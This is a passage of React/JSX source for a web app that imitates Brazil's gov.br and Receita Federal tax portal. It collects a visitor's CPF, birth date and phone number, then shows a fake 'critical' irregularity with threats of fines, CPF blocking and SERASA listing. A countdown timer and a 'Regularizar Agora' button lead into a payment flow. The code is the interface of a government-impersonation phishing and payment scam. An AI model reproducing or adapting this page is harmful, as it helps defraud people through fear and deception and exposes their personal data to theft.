                    className={`p-6 rounded-lg border-2 ${
                      index === paymentLoadingStep
                        ? "border-blue-500 bg-blue-50"
                        : index < paymentLoadingStep
                          ? "border-green-300 bg-green-25"
                          : "border-gray-200 bg-gray-50"
                    }`}
                  >
                    <div
                      className={`w-12 h-12 mx-auto mb-4 rounded-full flex items-center justify-center ${
                        index === 0
                          ? "bg-blue-500 text-white"
                          : index === 1
                            ? "bg-purple-500 text-white"
                            : "bg-green-500 text-white"
                      } ${index > paymentLoadingStep ? "opacity-50" : ""}`}
                    >
                      {index === 0 && <CreditCard className="h-6 w-6" />}
                      {index === 1 && <FileText className="h-6 w-6" />}
                      {index === 2 && <CheckCircle className="h-6 w-6" />}
                    </div>
                    <h3
                      className={`font-semibold mb-2 ${index <= paymentLoadingStep ? "text-gray-900" : "text-gray-500"}`}
                    >
                      {step}
                    </h3>
                    <p className={`text-sm ${index <= paymentLoadingStep ? "text-gray-600" : "text-gray-400"}`}>
                      {stepDescriptions[index]}
                      {index === paymentLoadingStep && (
                        <span className="block mt-1 text-blue-600 font-medium">Em andamento...</span>
                      )}
                    </p>
                  </div>
                ))}
              </div>
            </CardContent>
          </Card>
        </main>
      </div>
    )
  }

  if (appState === "loading") {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-100 via-blue-50 to-white">
        <header className="bg-white shadow-sm border-b">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div className="flex justify-between items-center h-16">
              <div className="flex items-center space-x-4">
                <div className="flex items-center space-x-2">
                  <span className="text-2xl font-bold">
                    <span className="text-blue-600">g</span>
                    <span className="text-yellow-500">o</span>
                    <span className="text-green-600">v</span>
                    <span className="text-blue-600">.</span>
                    <span className="text-blue-600">b</span>
                    <span className="text-yellow-500">r</span>
                  </span>
                </div>
                <div className="text-sm text-gray-600">
                  <div className="font-medium">Meu Imposto de Renda</div>
                  <div className="text-xs">Receita Federal</div>
                </div>
              </div>
              <div className="flex items-center space-x-4">
                <Bell className="h-5 w-5 text-gray-500" />
                <div className="text-sm text-gray-600">
                  <div>Sistema</div>
                  <div className="text-xs">gov.br</div>
                </div>
                <div className="bg-blue-600 text-white rounded-full p-2">
                  <User className="h-4 w-4" />
                </div>
              </div>
            </div>
          </div>
        </header>

        <main className="flex items-center justify-center min-h-[calc(100vh-4rem)] p-4">
          <Card className="w-full max-w-md bg-white shadow-lg">
            <CardContent className="p-8 text-center">
              <div className="text-4xl font-bold mb-6">
                <span className="text-blue-600">g</span>
                <span className="text-yellow-500">o</span>
                <span className="text-green-600">v</span>
                <span className="text-blue-600">.</span>
                <span className="text-blue-600">b</span>
                <span className="text-yellow-500">r</span>
              </div>

              <h1 className="text-2xl font-bold text-gray-900 mb-1">CPF Brasil</h1>
              <p className="text-gray-600 text-sm mb-8">Receita Federal do Brasil</p>

              <div className="w-16 h-16 mx-auto mb-6">
                <div className="w-16 h-16 border-4 border-blue-200 border-t-blue-600 rounded-full animate-spin"></div>
              </div>

              <h2 className="text-xl font-semibold text-gray-900 mb-4">Consultando seu CPF na Receita Federal</h2>

              <p className="text-gray-600 mb-8">Por favor, aguarde enquanto verificamos seus dados...</p>

              <div className="space-y-3 mb-8">
                {["Conectando com a base de dados", "Validando informações pessoais", "Preparando resultado"].map(
                  (step, index) => (
                    <div key={index} className="flex items-center space-x-3">
                      <div
                        className={`w-2 h-2 rounded-full ${
                          index < loadingStep ? "bg-blue-600" : index === loadingStep ? "bg-blue-400" : "bg-gray-300"
                        }`}
                      ></div>
                      <span className={`text-sm ${index <= loadingStep ? "text-gray-900" : "text-gray-500"}`}>
                        {step}
                      </span>
                    </div>
                  ),
                )}
              </div>

              <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-4">
                <div className="flex items-start space-x-3">
                  <div className="bg-blue-100 rounded-full p-1 mt-0.5">
                    <div className="w-2 h-2 bg-blue-600 rounded-full"></div>
                  </div>
                  <p className="text-sm text-blue-800">
                    Seus dados estão sendo processados de forma segura e confidencial.
                  </p>
                </div>
              </div>

              <div className="flex items-center justify-center text-sm text-gray-500">
                <Clock className="h-4 w-4 mr-2" />
                Redirecionando automaticamente...
              </div>
            </CardContent>
          </Card>
        </main>
      </div>
    )
  }

  if (appState === "result" && userData) {
    return (
      <div className="min-h-screen bg-gray-50">
        {userData.statusType === "CRÍTICO" && (
          <div className="bg-red-500 text-white text-center py-3 font-semibold">
            STATUS CRÍTICO: REGULARIZAÇÃO NECESSÁRIA
          </div>
        )}

        <header className="bg-white shadow-sm border-b">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div className="flex justify-between items-center h-16">
              <div className="flex items-center space-x-4">
                <div className="flex items-center space-x-2">
                  <span className="text-2xl font-bold">
                    <span className="text-blue-600">g</span>
                    <span className="text-yellow-500">o</span>
                    <span className="text-green-600">v</span>
                    <span className="text-blue-600">.</span>
                    <span className="text-blue-600">b</span>
                    <span className="text-yellow-500">r</span>
                  </span>
                </div>
                <div className="text-sm text-gray-600">
                  <div className="font-medium">Meu Imposto de Renda</div>
                  <div className="text-xs">Receita Federal</div>
                </div>
              </div>
              <div className="flex items-center space-x-4">
                <div className="text-sm text-gray-600 text-right">
                  <div className="font-medium">{userData.name}</div>
                  <div className="text-xs">CPF: {cpf}</div>
                </div>
                <div className="bg-blue-600 text-white rounded-full w-10 h-10 flex items-center justify-center font-semibold">
                  {userData.initials}
                </div>
              </div>
            </div>
          </div>
        </header>

        <main className="max-w-4xl mx-auto p-6">
          {userData.warning && (
            <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-6">
              <div className="flex items-center space-x-2">
                <AlertTriangle className="h-5 w-5 text-yellow-600" />
                <p className="text-sm text-yellow-800">
                  <strong>Aviso:</strong> {userData.warning}
                </p>
              </div>
            </div>
          )}

          <div className="text-center mb-8">
            <div className="bg-blue-600 text-white rounded-full w-20 h-20 flex items-center justify-center text-2xl font-bold mx-auto mb-4">
              {userData.initials}
            </div>
            <h1 className="text-3xl font-bold text-gray-900 mb-2">{userData.name}</h1>
            {userData.nomeMae && userData.nomeMae !== "Não informado" && (
              <p className="text-gray-600">Mãe: {userData.nomeMae}</p>
            )}
          </div>

          <div className="grid md:grid-cols-2 gap-6 mb-8">
            <div className="bg-white rounded-lg p-6 shadow-sm">
              <div className="flex items-center space-x-3 mb-4">
                <div className="bg-blue-100 p-2 rounded">
                  <User className="h-5 w-5 text-blue-600" />
                </div>
                <div>
                  <div className="text-sm text-gray-600">Data de Nascimento</div>
                  <div className="font-semibold">{userData.birthDate}</div>
                </div>
              </div>
            </div>

            <div className="bg-white rounded-lg p-6 shadow-sm">
              <div className="flex items-center space-x-3 mb-4">
                <div className="bg-gray-100 p-2 rounded">
                  <AlertCircle className="h-5 w-5 text-gray-600" />
                </div>
                <div>
                  <div className="text-sm text-gray-600">Situação Cadastral</div>
                  <div
                    className={`font-semibold ${userData.status === "IRREGULAR" ? "text-red-600" : "text-green-600"}`}
                  >
                    {userData.status}
                  </div>
                </div>
              </div>
            </div>

            <div className="bg-white rounded-lg p-6 shadow-sm">
              <div className="flex items-center space-x-3 mb-4">
                <div className="bg-blue-100 p-2 rounded">
                  <User className="h-5 w-5 text-blue-600" />
                </div>
                <div>
                  <div className="text-sm text-gray-600">Declaração IR 2023</div>
                  <div className="font-semibold">{userData.declaration}</div>
                </div>
              </div>
            </div>

            <div className="bg-red-50 border border-red-200 rounded-lg p-6">
              <div className="flex items-center space-x-3 mb-4">
                <AlertTriangle className="h-5 w-5 text-red-600" />
                <div>
                  <div className="text-sm text-red-600">CPF ({userData.cpfStatus})</div>
                  <div className="font-semibold text-red-600">{cpf}</div>
                </div>
              </div>
            </div>
          </div>

          {userData.statusType === "CRÍTICO" && (
            <>
              <div className="bg-white rounded-lg p-6 shadow-sm mb-6">
                <div className="grid grid-cols-3 gap-4 text-center">
                  <div>
                    <div className="text-sm text-gray-600">Protocolo</div>
                    <div className="font-semibold text-blue-600">{userData.protocol}</div>
                  </div>
                  <div>
                    <div className="text-sm text-gray-600">Prazo Final</div>
                    <div className="font-semibold text-red-600">{userData.deadline}</div>
                  </div>
                  <div>
                    <div className="text-sm text-gray-600">Status</div>
                    <div className="font-semibold text-red-600">CRÍTICO</div>
                  </div>
                </div>
              </div>

              <div className="grid md:grid-cols-2 gap-6 mb-8">
                <div className="bg-orange-50 border-l-4 border-orange-400 rounded-lg p-6">
                  <h3 className="font-semibold text-orange-800 mb-4 flex items-center">
                    <AlertTriangle className="h-5 w-5 mr-2" />
                    Irregularidade Detectada
                  </h3>
                  <p className="text-sm text-orange-700 mb-4">
                    Identificamos problemas graves na sua <strong>Declaração do Imposto de Renda 2023</strong>:
                  </p>
                  <ul className="space-y-2 text-sm text-orange-700">
                    <li className="flex items-center space-x-2">
                      <div className="w-1.5 h-1.5 bg-orange-400 rounded-full"></div>
                      <span>Dados inconsistentes na declaração</span>
                    </li>
                    <li className="flex items-center space-x-2">
                      <div className="w-1.5 h-1.5 bg-orange-400 rounded-full"></div>
                      <span>Atraso na entrega obrigatória</span>
                    </li>
                  </ul>
                  <div className="mt-4 text-xs text-orange-600">
                    <strong>Base Legal:</strong> Art. 1º da Lei nº 9.430/1996
                  </div>
                </div>

                <div className="bg-red-50 border-l-4 border-red-400 rounded-lg p-6">
                  <h3 className="font-semibold text-red-800 mb-4 flex items-center">
                    <AlertCircle className="h-5 w-5 mr-2" />
                    Consequências Imediatas
                  </h3>
                  <ul className="space-y-3 text-sm text-red-700">
                    <li className="flex items-center space-x-2">
                      <div className="w-1.5 h-1.5 bg-red-400 rounded-full"></div>
                      <span>Multa até 150%</span>
                    </li>
                    <li className="flex items-center space-x-2">
                      <div className="w-1.5 h-1.5 bg-red-400 rounded-full"></div>
                      <span>Bloqueio completo do CPF</span>
                    </li>
                    <li className="flex items-center space-x-2">
                      <div className="w-1.5 h-1.5 bg-red-400 rounded-full"></div>
                      <span>Suspensão de benefícios</span>
                    </li>
                    <li className="flex items-center space-x-2">
                      <div className="w-1.5 h-1.5 bg-red-400 rounded-full"></div>
                      <span>Restrições bancárias</span>
                    </li>
                    <li className="flex items-center space-x-2">
                      <div className="w-1.5 h-1.5 bg-red-400 rounded-full"></div>
                      <span>Bloqueio de documentos</span>
                    </li>
                    <li className="flex items-center space-x-2">
                      <div className="w-1.5 h-1.5 bg-red-400 rounded-full"></div>
                      <span>Inclusão no SERASA</span>
                    </li>
                  </ul>
                </div>
              </div>

              <div className="bg-white rounded-lg p-8 shadow-sm text-center">
                <h3 className="text-xl font-semibold text-gray-900 mb-4">Tempo Restante para Regularização</h3>
                <div className="flex justify-center space-x-8 text-3xl font-bold text-red-600">
                  <div className="text-center">
                    <div>{timeLeft.hours.toString().padStart(2, "0")}</div>
                    <div className="text-sm text-gray-600 font-normal">Horas</div>
                  </div>
                  <div className="text-center">
                    <div>{timeLeft.minutes.toString().padStart(2, "0")}</div>
                    <div className="text-sm text-gray-600 font-normal">Minutos</div>
                  </div>
                  <div className="text-center">
                    <div>{timeLeft.seconds.toString().padStart(2, "0")}</div>
                    <div className="text-sm text-gray-600 font-normal">Segundos</div>
                  </div>
                </div>
              </div>
            </>
          )}

          <div className="text-center mt-8">
            <Button onClick={handleBack} variant="outline" className="mr-4 bg-transparent">
              Voltar ao Login
            </Button>
            <Button onClick={handleRegularize} className="bg-blue-600 hover:bg-blue-700">
              Regularizar Agora
            </Button>
          </div>
        </main>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-100 via-blue-50 to-white">
      <header className="bg-white shadow-sm border-b">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center h-16">
            <div className="flex items-center space-x-4">
              <div className="flex items-center space-x-2">
                <span className="text-2xl font-bold">
                  <span className="text-blue-600">g</span>
                  <span className="text-yellow-500">o</span>
                  <span className="text-green-600">v</span>
                  <span className="text-blue-600">.</span>
                  <span className="text-blue-600">b</span>
                  <span className="text-yellow-500">r</span>
                </span>
              </div>
              <div className="text-sm text-gray-600">
                <div className="font-medium">Meu Imposto de Renda</div>
                <div className="text-xs">Receita Federal</div>
              </div>
            </div>
            <div className="flex items-center space-x-4">
              <Bell className="h-5 w-5 text-gray-500" />
              <div className="text-sm text-gray-600">
                <div>Sistema</div>
                <div className="text-xs">gov.br</div>
              </div>
              <div className="bg-blue-600 text-white rounded-full p-2">
                <User className="h-4 w-4" />
              </div>
            </div>
          </div>
        </div>
      </header>

      <main className="flex items-center justify-center min-h-[calc(100vh-4rem)] p-4">
        <Card className="w-full max-w-md bg-white shadow-lg">
          <CardContent className="p-8">
            <div className="text-center mb-6">
              <div className="text-4xl font-bold mb-2">
                <span className="text-blue-600">g</span>
                <span className="text-yellow-500">o</span>
                <span className="text-green-600">v</span>
                <span className="text-blue-600">.</span>
                <span className="text-blue-600">b</span>
                <span className="text-yellow-500">r</span>
              </div>
              <h1 className="text-2xl font-bold text-gray-900 mb-1">CPF Brasil</h1>
              <p className="text-gray-600 text-sm">Receita Federal do Brasil</p>
            </div>

            <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
              <div className="flex items-start space-x-3">
                <div className="bg-blue-100 rounded-full p-1 mt-0.5">
                  <div className="w-2 h-2 bg-blue-600 rounded-full"></div>
                </div>
                <p className="text-sm text-blue-800">
                  Ao prosseguir, você concorda com nossos{" "}
                  <a href="#" className="text-blue-600 underline">
                    Termos de Uso
                  </a>{" "}
                  e{" "}
                  <a href="#" className="text-blue-600 underline">
                    Política de privacidade
                  </a>
                  .
                </p>
              </div>
            </div>

            <div className="space-y-4">
              <div>
                <label htmlFor="cpf" className="block text-sm font-medium text-gray-700 mb-2">
                  <span className="text-red-500">*</span> Digite Seu CPF:
                </label>
                <Input
                  id="cpf"
                  type="text"
                  placeholder="000.000.000-00"
                  className="w-full h-12 text-center text-lg tracking-wider"
                  value={cpf}
                  onChange={handleCPFChange}
                  inputMode="numeric"
                />
              </div>

              <div>
                <label htmlFor="birthDate" className="block text-sm font-medium text-gray-700 mb-2">
                  <span className="text-red-500">*</span> Digite sua data de nascimento:
                </label>
                <Input
                  id="birthDate"
                  type="text"
                  placeholder="DD/MM/AAAA"
                  className="w-full h-12 text-center text-lg tracking-wider"
                  value={birthDate}
                  onChange={handleBirthDateChange}
                  inputMode="numeric"
                />
              </div>

              <div>
                <label htmlFor="phone" className="block text-sm font-medium text-gray-700 mb-2">
                  <span className="text-red-500">*</span> Digite seu telefone:
                </label>
                <Input
                  id="phone"
                  type="text"
                  placeholder="(11) 99999-9999"
                  className="w-full h-12 text-center text-lg tracking-wider"
                  value={phone}
                  onChange={handlePhoneChange}
                  inputMode="numeric"
                />
              </div>

              <Button
                className="w-full h-12 bg-blue-600 hover:bg-blue-700 text-white font-medium"
                onClick={handleSubmit}
                disabled={cpf.length !== 14 || birthDate.length !== 10 || phone.replace(/\D/g, "").length < 10}
              >
                <span className="mr-2">→</span>
                ENTRAR COM GOV.BR
              </Button>
            </div>

            <div className="flex items-center justify-center mt-6 text-sm text-gray-500">
              <Lock className="h-4 w-4 mr-2" />
              Conexão segura
            </div>
          </CardContent>
        </Card>
      </main>
    </div>
  )
}
